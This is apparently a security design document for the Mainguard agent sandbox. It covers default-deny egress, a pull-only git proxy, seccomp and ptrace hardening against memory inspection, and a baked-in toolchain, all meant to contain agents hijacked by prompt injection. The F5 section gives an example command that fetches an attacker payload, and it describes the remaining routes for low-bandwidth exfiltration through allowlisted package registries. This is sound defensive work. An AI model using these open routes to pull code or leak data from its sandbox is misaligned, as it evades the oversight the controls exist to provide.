# Mainguard Security Architecture — Sandbox Egress & Exfiltration Controls

**Status:** Living document · **Owner (long-term):** P2-17 (network transparency) · **Seeded by:** P2-07
(sandbox hardening + default-deny egress). This file states the accepted-and-stated residuals now so the
guarantee is honest before P2-17 expands it.

This document records the structural controls that bound prompt-injection exfiltration from an agent
sandbox, and — crucially — the **residual** that those controls do *not* close, so no reader mistakes
"default-deny egress" for "no exfiltration is possible."

## The layered controls (P2-07)

| # | Control | Kind | Where |
|---|---|---|---|
| S-1 | P2-06 quarantine: no git-host credential and no remote but the daemon bare mirror | STRUCT | `WorktreeManager` |
| G-15 | Hardened container spec: `no-new-privileges`, default-deny seccomp (moby default + the 3 memory-inspection denials), `CapDrop ALL`, userns, limits, read-only rootfs | STRUCT/CHECK | `ContainerSpecBuilder` |
| G-11 | ext4-only worktree mount; Windows/UNC sources rejected at construction | STRUCT | `ContainerSpecBuilder` |
| — | Default-deny egress: internal network + allowlist proxy + pinned DNS + iptables backstop | STRUCT/CHECK | `EgressProxyConfigurator` |
| A6 | Git host absent from the agent allowlist; the only path to it is the daemon read-only, prefix-allowlisted git proxy; push has no code path | STRUCT | `EgressAllowlist`, `DaemonGitProxy` |
| G2 | Anti-memory-inspection quartet, so the agent uid obtains zero bytes of the OOB key `K` | STRUCT | controls 1/3/4 in `ContainerSpecBuilder`; control 2 (`kernel.yama.ptrace_scope`) VM-wide in P2-05 |

## A6 — no direct git-host egress

The agent's egress allowlist contains **no git-host entry** by default, and the UI marks a user-added
git-host entry as defeating A6. Git-sourced installs (`pip install git+https://…`, Go modules, git
submodules) are served by `DaemonGitProxy`: fetch/`upload-pack` **only**, only for allowlisted
`host + org` prefixes, performed daemon-side with the daemon's credentials (the sandbox never holds
git-host credentials — the P2-06 quarantine holds). Push/`receive-pack` has **no code path** — the
refusal is structural, audited (`egress_denied`), and transparency-logged.

## G2 — anti-memory-inspection quartet

The OOB `ControlFrame` forgery-[STRUCT] guarantee depends on the agent uid obtaining zero bytes of `K`.
Four controls ship together: (1) the `K` tmpfs is mode 0400 owned by a dedicated supervisor uid ≠ the
agent uid; (2) `kernel.yama.ptrace_scope ≥ 2` VM-wide (P2-05); (3) the seccomp profile denies
`process_vm_readv`/`process_vm_writev`/`ptrace`; (4) no `CAP_SYS_PTRACE`. The in-container memory scrape
is closed structurally by (3)+(4) alone; (1) closes the file path; (2) is defense-in-depth. The
container-spec builder asserts (1),(3),(4) on **every** create request; dropping any is a typed builder
error.

**Control (2) is machine-wide, by necessity (MG-33).** WSL2 runs every distro on ONE shared kernel and
`kernel.yama.ptrace_scope` is not namespaced, so the value `FirstBootStep` writes at first boot applies
to the user's *other* WSL2 distros too for as long as the WSL VM is up. It is strictly a hardening (it
restricts ptrace to admin-capable processes), never a weakening, but it is a real side effect outside
Mainguard's distro: a debugger/profiler attaching to an already-running pid in another distro may start
needing `sudo`. It is bounded and reversible — the live value resets on the next full `wsl --shutdown`,
and the persisted `/etc/sysctl.d/99-mainguard-sandbox.conf` drop-in lives *inside* `MainguardEnv`, so it
goes away with the distro at uninstall. Per-distro scoping is impossible (non-namespaced sysctl) and
Docker rejects it as a per-container `--sysctl`, which is why it is boot-provisioned VM-wide and
disclosed in the OOBE progress log rather than narrowed.

The shipped seccomp profile is the **canonical moby/containerd default-deny profile**
(`defaultAction: SCMP_ACT_ERRNO`, the standard `archMap` and ~300-syscall allowlist) with the three
memory-inspection syscalls removed from every allow rule and explicitly denied — so the agent keeps the
full default hardening (`mount`/`bpf`/`pivot_root` stay capability-gated and, under `CapDrop ALL`,
unreachable; `kexec_load` et al. are default-denied) on top of the G2 denials. Because a custom
`seccomp=<json>` **replaces** Docker's default rather than layering onto it, the profile reproduces that
default; it is never `unconfined`. It is a single source of truth: `images/mainguard-agent-base/seccomp.json`
is embedded into `Mainguard.Agents` (`SeccompProfile.Json`) and passed to `CreateContainerAsync` verbatim, so
what the tests assert equals what the container runs.

## F5 — the package-proxy caveat (accepted-and-stated residual)

**"Pull-only" ≠ "cannot fetch attacker code" ≠ "cannot exfiltrate."** A wholesale allowlisted *language*
proxy (Go proxy, npm, crates) is a general-purpose fetch channel: `go get github.com/attacker/payload`
resolves a second-stage payload and leaks bytes in the request path even though the git host itself is
off the agent allowlist. A6 removes the *direct* git route; it does **not** by itself close
payload-pull or low-bandwidth request-path exfiltration through an allowlisted registry.

Compensating controls, in order of preference:

1. **Declared-dependency scoping (preferred).** Module fetches route through the daemon proxy with
   `DeclaredDependencyResolver` resolving `go.mod`/`package.json`/lockfiles to the exact module set;
   requests outside it are denied (typed `DeclaredDependencyDeniedException`) and logged.
2. **Transparency + anomaly.** Where a native registry front cannot be replaced (protocol constraints),
   every package-proxy fetch is a P2-17 transparency line **and** a P2-44 anomaly signal — never silent.

**The accepted residual:** public-payload pull plus low-bandwidth request-path exfiltration via an
allowlisted registry is **accepted and stated**. It is bounded by:

- **no push / no credentials** — nothing an agent fetches lets it write to the git host or exfiltrate
  through it; the sandbox holds no git-host credential (S-1);
- **the verify → review → flagged-gate → human-merge backstop** — whatever an injected agent produces is
  still untrusted code facing human review before any merge. This human-review backstop, not egress, is
  what actually bounds a determined exfiltrator; egress raises the cost, it is not a proof of no-exfil.

This residual is intentional and re-stated here so the security posture is honest: the controls above
make exfiltration expensive and observable, not impossible.

---

## Runtime toolchain: pre-baked, not `devbox add` (A6 decision)

The design intent was that agents sideload toolchains at runtime via `devbox add <tool>`. In a strict
A6 jail this is not achievable: devbox resolves packages through nixhub and then fetches **nixpkgs from
github** (`api.github.com` / `github.com/NixOS/nixpkgs/archive/<rev>.tar.gz`) at run time — reaching the
git host A6 exists to keep off the agent's egress. Every strict-A6 workaround (pinning `nixpkgs.commit`,
an exact-commit flakeref, a local `path:` nixpkgs) either still re-fetches github or requires a full,
slow local nixpkgs evaluation.

**Decision:** the curated toolchain (jq, ripgrep, fd, tree, gnumake, nodejs, python3, go) is **Nix-installed
at image-build time** into a persistent `/opt/toolchain` profile that is on the agent's PATH from the
read-only image. At runtime the tools are present and runnable with **zero egress** — no git host, no
nixhub, not even `cache.nixos.org` — so A6 stays fully intact and the read-only rootfs is preserved (no
writable `/nix` volume). A fixed, audited toolchain is also a *stronger* posture than arbitrary runtime
package pulls: it closes the general-purpose fetch/exfil channel the F5 caveat above describes.

**Accepted residual → filed as P2-46 (the lead v1.x feature):** an agent cannot add an *arbitrary* new
tool at runtime. The A6-clean solution — a **daemon-mediated** nix resolver + binary mirror that resolves
and fetches the closure daemon-side (the daemon being the only component permitted a git host / nixhub,
exactly as the P2-06 read-only git proxy is) and injects it into the jail, keeping the git host off the
*agent* allowlist — is specified as **P2-46** in the master implementation document and slated as the
first post-v1.0 feature. The `devbox` binary is baked so that path can be built on later.
